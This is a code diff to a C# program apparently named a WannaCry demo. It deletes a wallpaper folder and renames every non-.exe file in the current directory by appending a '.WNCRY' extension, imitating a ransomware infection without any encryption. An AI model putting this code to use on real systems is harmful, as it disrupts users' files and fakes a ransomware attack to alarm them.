@@ -33,7 +33,6 @@ namespace WannaCrydemo
             //删除释放的文件
             DirectoryInfo di = new DirectoryInfo(@".\wallpaper");
             di.Delete(true);
-
         }
 
         //释放壁纸文件到wallpaper目录
@@ -57,26 +56,26 @@ namespace WannaCrydemo
         //修改文件扩展为.WNCRY
         static void UpdateExtension()
         {
-            string extension = ".WNCRY";
-            string path = Directory.GetCurrentDirectory() + @"\";
+            string path = Directory.GetCurrentDirectory();
 
             DirectoryInfo dir = new DirectoryInfo(path);
             FileInfo[] files = dir.GetFiles("*.*", SearchOption.TopDirectoryOnly);
             for (int i = 0; i < files.Length; i++)
             {
-                bool isContain = files[i].FullName.Contains(".exe");
+                bool isContain = (files[i].FullName.Contains(".exe") || files[i].FullName.Contains(".WNCRY"));
 
                 if (isContain){}
                 else
                 {
                     Path.GetExtension(files[i].FullName);
-                    files[i].MoveTo(Path.ChangeExtension(files[i].FullName, extension));
+                    files[i].MoveTo(Path.ChangeExtension(files[i].FullName, files[i].Extension+ ".WNCRY"));
                     Path.GetExtension(files[i].FullName);
                 }
             }
         }
 
     }
+
 
 
 }
